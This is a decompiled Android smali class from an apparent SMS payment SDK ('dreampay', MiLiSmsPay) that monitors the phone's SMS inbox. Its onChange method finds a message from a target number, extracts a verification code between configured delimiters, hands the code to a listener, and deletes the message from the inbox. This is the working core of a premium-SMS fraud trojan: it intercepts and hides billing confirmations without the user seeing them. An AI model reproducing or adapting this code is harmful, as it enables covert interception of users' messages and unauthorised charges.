.class final Lcom/yuelan/dreampay/pay/I;
.super Landroid/database/ContentObserver;


# instance fields
.field final synthetic a:Lcom/yuelan/dreampay/pay/MiLiSmsPay;

.field private b:Landroid/content/Context;

.field private c:Ljava/lang/String;

.field private d:Lcom/yuelan/dreampay/listen/SmsReceiverListener;

.field private e:J

.field private f:Ljava/lang/String;

.field private g:Ljava/lang/String;

.field private h:Z


# direct methods
.method public constructor <init>(Lcom/yuelan/dreampay/pay/MiLiSmsPay;Landroid/os/Handler;Landroid/content/Context;Ljava/lang/String;Lcom/yuelan/dreampay/listen/SmsReceiverListener;JLjava/lang/String;Ljava/lang/String;)V
    .locals 3

    iput-object p1, p0, Lcom/yuelan/dreampay/pay/I;->a:Lcom/yuelan/dreampay/pay/MiLiSmsPay;

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/yuelan/dreampay/pay/I;->h:Z

    iput-object p3, p0, Lcom/yuelan/dreampay/pay/I;->b:Landroid/content/Context;

    iput-object p4, p0, Lcom/yuelan/dreampay/pay/I;->c:Ljava/lang/String;

    iput-object p5, p0, Lcom/yuelan/dreampay/pay/I;->d:Lcom/yuelan/dreampay/listen/SmsReceiverListener;

    iput-wide p6, p0, Lcom/yuelan/dreampay/pay/I;->e:J

    iput-object p8, p0, Lcom/yuelan/dreampay/pay/I;->f:Ljava/lang/String;

    iput-object p9, p0, Lcom/yuelan/dreampay/pay/I;->g:Ljava/lang/String;

    new-instance v0, Lcom/yuelan/dreampay/pay/J;

    invoke-direct {v0, p0, p5}, Lcom/yuelan/dreampay/pay/J;-><init>(Lcom/yuelan/dreampay/pay/I;Lcom/yuelan/dreampay/listen/SmsReceiverListener;)V

    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/yuelan/dreampay/pay/K;

    invoke-direct {v2, p0, v0}, Lcom/yuelan/dreampay/pay/K;-><init>(Lcom/yuelan/dreampay/pay/I;Landroid/os/Handler;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method static synthetic a(Lcom/yuelan/dreampay/pay/I;)Z
    .locals 1

    iget-boolean v0, p0, Lcom/yuelan/dreampay/pay/I;->h:Z

    return v0
.end method

.method static synthetic b(Lcom/yuelan/dreampay/pay/I;)V
    .locals 1

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/yuelan/dreampay/pay/I;->h:Z

    return-void
.end method

.method static synthetic c(Lcom/yuelan/dreampay/pay/I;)Lcom/yuelan/dreampay/pay/MiLiSmsPay;
    .locals 1

    iget-object v0, p0, Lcom/yuelan/dreampay/pay/I;->a:Lcom/yuelan/dreampay/pay/MiLiSmsPay;

    return-object v0
.end method


# virtual methods
.method public final onChange(Z)V
    .locals 6

    const/4 v5, 0x0

    const-string v0, "selfChange"

    invoke-static {v0}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    iget-boolean v0, p0, Lcom/yuelan/dreampay/pay/I;->h:Z

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/yuelan/dreampay/pay/I;->a:Lcom/yuelan/dreampay/pay/MiLiSmsPay;

    invoke-static {v0}, Lcom/yuelan/dreampay/pay/MiLiSmsPay;->a(Lcom/yuelan/dreampay/pay/MiLiSmsPay;)Landroid/app/Activity;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Activity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-virtual {v0, p0}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    :goto_0
    return-void

    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iget-wide v2, p0, Lcom/yuelan/dreampay/pay/I;->e:J

    sub-long/2addr v0, v2

    sget-wide v2, Lcom/yuelan/dreampay/date/ConFigFile;->TIME_YZMWAIT:J

    cmp-long v0, v0, v2

    if-lez v0, :cond_1

    const-string v0, "timeout"

    invoke-static {v0}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    goto :goto_0

    :cond_1
    :try_start_0
    iget-object v0, p0, Lcom/yuelan/dreampay/pay/I;->b:Landroid/content/Context;

    const-string v1, "content://sms/inbox"

    invoke-static {v0, v1}, Lcom/yuelan/codelib/sim/SmsContent;->getSmsInfo(Landroid/content/Context;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v0

    if-eqz v0, :cond_a

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v1

    if-lez v1, :cond_a

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/yuelan/codelib/sim/SmsInfo;

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getDate()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Long;->valueOf(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v1

    iget-wide v3, p0, Lcom/yuelan/dreampay/pay/I;->e:J

    cmp-long v1, v1, v3

    if-gez v1, :cond_3

    const-string v0, "timereturn"

    invoke-static {v0}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    iget-object v0, p0, Lcom/yuelan/dreampay/pay/I;->d:Lcom/yuelan/dreampay/listen/SmsReceiverListener;

    const-string v1, "ex"

    invoke-interface {v0, v5, v1}, Lcom/yuelan/dreampay/listen/SmsReceiverListener;->receiver(Ljava/lang/String;Ljava/lang/String;)V

    :cond_2
    :goto_1
    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    goto :goto_0

    :cond_3
    :try_start_1
    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getPhoneNumber()Ljava/lang/String;

    move-result-object v1

    const-string v2, "+86"

    invoke-virtual {v1, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_4

    const-string v2, "+86"

    const-string v3, ""

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    :cond_4
    iget-object v2, p0, Lcom/yuelan/dreampay/pay/I;->c:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_2

    const/4 v2, 0x1

    iput-boolean v2, p0, Lcom/yuelan/dreampay/pay/I;->h:Z

    iget-object v2, p0, Lcom/yuelan/dreampay/pay/I;->a:Lcom/yuelan/dreampay/pay/MiLiSmsPay;

    invoke-static {v2}, Lcom/yuelan/dreampay/pay/MiLiSmsPay;->a(Lcom/yuelan/dreampay/pay/MiLiSmsPay;)Landroid/app/Activity;

    move-result-object v2

    invoke-virtual {v2}, Landroid/app/Activity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    invoke-virtual {v2, p0}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getSmsbody()Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->f:Ljava/lang/String;

    invoke-static {v3}, Lcom/yuelan/codelib/utils/TextUtil;->notNull(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_6

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->g:Ljava/lang/String;

    invoke-static {v3}, Lcom/yuelan/codelib/utils/TextUtil;->notNull(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_6

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->g:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_5

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->g:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v4, 0x0

    invoke-virtual {v2, v4, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/yuelan/codelib/utils/TextUtil;->cleanChar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->a:Lcom/yuelan/dreampay/pay/MiLiSmsPay;

    invoke-static {v3}, Lcom/yuelan/dreampay/pay/MiLiSmsPay;->a(Lcom/yuelan/dreampay/pay/MiLiSmsPay;)Landroid/app/Activity;

    move-result-object v3

    const-string v4, "content://sms/inbox"

    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getPhoneNumber()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v4, v0}, Lcom/yuelan/codelib/sim/SmsContent;->deteleSms_phoneNum(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/yuelan/dreampay/pay/I;->d:Lcom/yuelan/dreampay/listen/SmsReceiverListener;

    invoke-interface {v0, v1, v2}, Lcom/yuelan/dreampay/listen/SmsReceiverListener;->receiver(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    :cond_5
    iget-object v1, p0, Lcom/yuelan/dreampay/pay/I;->a:Lcom/yuelan/dreampay/pay/MiLiSmsPay;

    invoke-static {v1}, Lcom/yuelan/dreampay/pay/MiLiSmsPay;->a(Lcom/yuelan/dreampay/pay/MiLiSmsPay;)Landroid/app/Activity;

    move-result-object v1

    const-string v2, "content://sms/inbox"

    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getPhoneNumber()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v2, v0}, Lcom/yuelan/codelib/sim/SmsContent;->deteleSms_phoneNum(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/yuelan/dreampay/pay/I;->d:Lcom/yuelan/dreampay/listen/SmsReceiverListener;

    const/4 v1, 0x0

    const-string v2, "nokey"

    invoke-interface {v0, v1, v2}, Lcom/yuelan/dreampay/listen/SmsReceiverListener;->receiver(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    :cond_6
    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->f:Ljava/lang/String;

    invoke-static {v3}, Lcom/yuelan/codelib/utils/TextUtil;->notNull(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_8

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->g:Ljava/lang/String;

    invoke-static {v3}, Lcom/yuelan/codelib/utils/TextUtil;->notNull(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_8

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->f:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_7

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->f:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    iget-object v4, p0, Lcom/yuelan/dreampay/pay/I;->f:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    add-int/2addr v3, v4

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v4

    invoke-virtual {v2, v3, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/yuelan/codelib/utils/TextUtil;->cleanChar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->a:Lcom/yuelan/dreampay/pay/MiLiSmsPay;

    invoke-static {v3}, Lcom/yuelan/dreampay/pay/MiLiSmsPay;->a(Lcom/yuelan/dreampay/pay/MiLiSmsPay;)Landroid/app/Activity;

    move-result-object v3

    const-string v4, "content://sms/inbox"

    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getPhoneNumber()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v4, v0}, Lcom/yuelan/codelib/sim/SmsContent;->deteleSms_phoneNum(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/yuelan/dreampay/pay/I;->d:Lcom/yuelan/dreampay/listen/SmsReceiverListener;

    invoke-interface {v0, v1, v2}, Lcom/yuelan/dreampay/listen/SmsReceiverListener;->receiver(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    :cond_7
    iget-object v1, p0, Lcom/yuelan/dreampay/pay/I;->a:Lcom/yuelan/dreampay/pay/MiLiSmsPay;

    invoke-static {v1}, Lcom/yuelan/dreampay/pay/MiLiSmsPay;->a(Lcom/yuelan/dreampay/pay/MiLiSmsPay;)Landroid/app/Activity;

    move-result-object v1

    const-string v2, "content://sms/inbox"

    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getPhoneNumber()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v2, v0}, Lcom/yuelan/codelib/sim/SmsContent;->deteleSms_phoneNum(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/yuelan/dreampay/pay/I;->d:Lcom/yuelan/dreampay/listen/SmsReceiverListener;

    const/4 v1, 0x0

    const-string v2, "nokey"

    invoke-interface {v0, v1, v2}, Lcom/yuelan/dreampay/listen/SmsReceiverListener;->receiver(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    :cond_8
    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->f:Ljava/lang/String;

    invoke-static {v3}, Lcom/yuelan/codelib/utils/TextUtil;->notNull(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_2

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->g:Ljava/lang/String;

    invoke-static {v3}, Lcom/yuelan/codelib/utils/TextUtil;->notNull(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_2

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->f:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_9

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->g:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_9

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->f:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    iget-object v4, p0, Lcom/yuelan/dreampay/pay/I;->f:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    add-int/2addr v3, v4

    iget-object v4, p0, Lcom/yuelan/dreampay/pay/I;->g:Ljava/lang/String;

    invoke-virtual {v2, v4, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v4

    invoke-virtual {v2, v3, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/yuelan/codelib/utils/TextUtil;->cleanChar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Lcom/yuelan/dreampay/pay/I;->a:Lcom/yuelan/dreampay/pay/MiLiSmsPay;

    invoke-static {v3}, Lcom/yuelan/dreampay/pay/MiLiSmsPay;->a(Lcom/yuelan/dreampay/pay/MiLiSmsPay;)Landroid/app/Activity;

    move-result-object v3

    const-string v4, "content://sms/inbox"

    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getPhoneNumber()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v4, v0}, Lcom/yuelan/codelib/sim/SmsContent;->deteleSms_phoneNum(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/yuelan/dreampay/pay/I;->d:Lcom/yuelan/dreampay/listen/SmsReceiverListener;

    invoke-interface {v0, v1, v2}, Lcom/yuelan/dreampay/listen/SmsReceiverListener;->receiver(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    :cond_9
    iget-object v1, p0, Lcom/yuelan/dreampay/pay/I;->a:Lcom/yuelan/dreampay/pay/MiLiSmsPay;

    invoke-static {v1}, Lcom/yuelan/dreampay/pay/MiLiSmsPay;->a(Lcom/yuelan/dreampay/pay/MiLiSmsPay;)Landroid/app/Activity;

    move-result-object v1

    const-string v2, "content://sms/inbox"

    invoke-virtual {v0}, Lcom/yuelan/codelib/sim/SmsInfo;->getPhoneNumber()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v2, v0}, Lcom/yuelan/codelib/sim/SmsContent;->deteleSms_phoneNum(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/yuelan/dreampay/pay/I;->d:Lcom/yuelan/dreampay/listen/SmsReceiverListener;

    const/4 v1, 0x0

    const-string v2, "nokey"

    invoke-interface {v0, v1, v2}, Lcom/yuelan/dreampay/listen/SmsReceiverListener;->receiver(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    :cond_a
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/yuelan/dreampay/pay/I;->h:Z

    iget-object v0, p0, Lcom/yuelan/dreampay/pay/I;->a:Lcom/yuelan/dreampay/pay/MiLiSmsPay;

    invoke-static {v0}, Lcom/yuelan/dreampay/pay/MiLiSmsPay;->a(Lcom/yuelan/dreampay/pay/MiLiSmsPay;)Landroid/app/Activity;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Activity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-virtual {v0, p0}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    iget-object v0, p0, Lcom/yuelan/dreampay/pay/I;->d:Lcom/yuelan/dreampay/listen/SmsReceiverListener;

    const/4 v1, 0x0

    const-string v2, "nomsg"

    invoke-interface {v0, v1, v2}, Lcom/yuelan/dreampay/listen/SmsReceiverListener;->receiver(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_1
.end method
